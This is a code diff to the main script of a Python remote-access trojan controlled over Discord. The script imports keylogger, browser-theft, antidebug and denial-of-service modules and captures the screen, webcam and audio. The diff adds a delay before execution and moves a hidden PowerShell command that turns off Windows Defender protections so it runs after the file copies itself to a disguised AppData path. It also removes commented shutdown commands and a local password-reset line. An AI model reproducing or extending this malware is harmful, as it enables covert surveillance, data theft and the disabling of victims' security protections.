@@ -1,11 +1,11 @@
-import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg 
+import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg, time#, shutil
 from pynput.mouse import Controller
 from PIL import ImageGrab, Image
 import cv2, pyaudio, datetime, socket
 import cryptography.fernet as fernet
 #from tkinter import messagebox
 import sys
-from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG, EXEC_DELAY, DELAY
 from modules.browser import run, delete_files
 from modules.keylogger import Keylogger
 from modules.antidebug import Antidebug
@@ -21,23 +21,15 @@ from modules.dos import DoS
 #STDOUT = -2
 #DEVNULL = -3
 
+#if EXEC_DELAY:
+#    time.sleep(DELAY)
+
 
 if ANTIDEBUG:
     try:
         if Antidebug().main():
             sys.exit(1)
     except: pass
-
-def disable_defender():
-    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
-    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
-    try:
-        subprocess.run(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-    except:
-        pass
-    
-if DEFENDER:
-    disable_defender()
 
 
 def copyfile(file, target):
@@ -47,9 +39,13 @@ def copyfile(file, target):
 
         with open(target, "wb") as f:
             f.write(bins)
-    except: return
+        
+        return True
+    except: return False
+
 
 file_dir = sys.argv[0]
+
 
 def move():
     try:
@@ -70,6 +66,7 @@ def move():
             sys.exit(0)
         except:
             pass
+
         os.chdir(os.path.dirname(sys.argv[0]))
     except:
         os.chdir(os.path.dirname(sys.argv[0]))
@@ -79,6 +76,23 @@ def move():
 if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
     move()
 
+
+if EXEC_DELAY:
+    time.sleep(DELAY)
+
+
+
+def disable_defender():
+    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
+    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
+    try:
+        subprocess.run(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+    except:
+        pass
+
+
+if DEFENDER:
+    disable_defender()
 
 #def error():
 #    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
@@ -1172,19 +1186,4 @@ if check_internet():
             pass
 else: Startup(sys.argv[0])
 
-
-#subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-#subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-#C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-
-
-
-#C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System
-
-
-
-#f"Get-LocalUser -Name '{username}' | Reset-LocalUserPassword -NewPassword (ConvertTo-SecureString -String '{password}' -AsPlainText -Force)"
 
